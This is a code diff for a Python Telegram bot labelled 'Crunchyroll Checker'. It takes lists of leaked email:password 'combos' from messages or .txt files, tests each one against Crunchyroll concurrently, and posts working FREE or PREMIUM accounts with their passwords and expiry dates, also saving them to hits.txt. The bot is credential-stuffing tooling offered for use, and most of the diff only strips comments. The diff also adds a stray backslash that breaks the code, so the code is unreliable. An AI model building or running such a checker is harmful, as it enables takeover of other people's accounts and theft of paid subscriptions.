@@ -7,8 +7,6 @@ from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 from telegram.constants import ParseMode
 
-# ================== CHECKER ==================
-
 def crunchyroll_check(email: str, password: str):
     try:
         device_id = str(uuid4())
@@ -76,40 +74,30 @@ def crunchyroll_check(email: str, password: str):
         return {'status': 'INVALID'}
 
 
-# ================== ASYNC WRAPPER ==================
-
 async def run_check(email, password):
     loop = asyncio.get_running_loop()
     return await loop.run_in_executor(None, crunchyroll_check, email, password)
 
-
-# ================== PARSER ==================
 
 def extract_combos(text):
     pattern = r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})\s*:\s*([^\s|]+)'
     return re.findall(pattern, text)
 
 
-# ================== COMMAND ==================
-
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "🔥 Crunchyroll Checker\n\n"
+        "Bot made by @Sudhakaran12\n\n"
         "Send combos or .txt file\n"
-        "Format: email:password"
+        "Only FREE and PREMIUM shown"
     )
 
 
-# ================== CORE CHECK ==================
-
 async def process_combos(update, combos):
     total = len(combos)
-
     await update.message.reply_text(f"✅ Found {total} accounts\n⚡ Checking...")
 
-    semaphore = asyncio.Semaphore(5)  # control speed
-
-    results = []
+    semaphore = asyncio.Semaphore(5)
 
     async def worker(email, password):
         async with semaphore:
@@ -120,11 +108,9 @@ async def process_combos(update, combos):
     responses = await asyncio.gather(*tasks)
 
     hits = 0
-
     for res in responses:
         if res['status'] in ["PREMIUM", "FREE"]:
             hits += 1
-
             text = f"""
 <b>{'🎯 PREMIUM' if res['status']=='PREMIUM' else '🆓 FREE'}</b>
 
@@ -133,70 +119,49 @@ PASSWORD: {res['password']}
 STATUS: {res['status']}
 EXPIRY: {res['expiry']}
 """
-
             await update.message.reply_text(text, parse_mode=ParseMode.HTML)
 
             with open("hits.txt", "a") as f:
                 f.write(text + "\n")
 
-            await asyncio.sleep(0.3)  # prevent flood
+            await asyncio.sleep(0.3)
 
-    await update.message.reply_text(
-        f"✅ Done!\n\nTotal: {total}\nHits: {hits}"
-    )
+    await update.message.reply_text(f"✅ Done!\nTotal: {total}\nHits: {hits}")
 
-
-# ================== MESSAGE HANDLER ==================
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text or ""
     if text.startswith('/'):
         return
-
     combos = extract_combos(text)
-
     if not combos:
         return await update.message.reply_text("❌ No combos found")
-
     await process_combos(update, combos)
 
-
-# ================== FILE HANDLER ==================
 
 async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     doc = update.message.document
-
     if not doc.file_name.endswith(".txt"):
         return await update.message.reply_text("❌ Only .txt allowed")
-
     file = await context.bot.get_file(doc.file_id)
     content = (await file.download_as_bytearray()).decode("utf-8", errors="ignore")
-
     combos = extract_combos(content)
-
     if not combos:
         return await update.message.reply_text("❌ No combos found")
-
     await process_combos(update, combos)
 
 
-# ================== MAIN ==================
-
 def main():
     TOKEN = os.getenv("BOT_TOKEN")
-
     if not TOKEN:
         print("❌ BOT_TOKEN missing")
         return
-
     app = Application.builder().token(TOKEN).build()
-
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+    app.add_handler(MessageHandler(filters.TEXT & \~filters.COMMAND, handle_message))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
-
     print("🚀 Bot Running...")
-    app.run_polling()
+    app.run_polling(drop_pending_updates=True)
 
 
 if __name__ == "__main__":
